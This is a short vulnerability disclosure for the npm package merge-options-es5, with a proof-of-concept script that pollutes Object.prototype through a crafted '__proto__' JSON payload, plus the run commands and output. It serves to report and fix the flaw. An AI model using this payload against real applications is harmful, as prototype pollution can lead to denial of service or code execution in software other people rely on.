# Description

`merge-options-es5` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
merge = require('merge-options-es5')

console.log(`Before: ${{}.polluted}`)
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'))
console.log(`After: ${{}.polluted}`)
```
2. Execute the following commands in the terminal:
```bash
npm i merge-options-es5 # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: true
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.
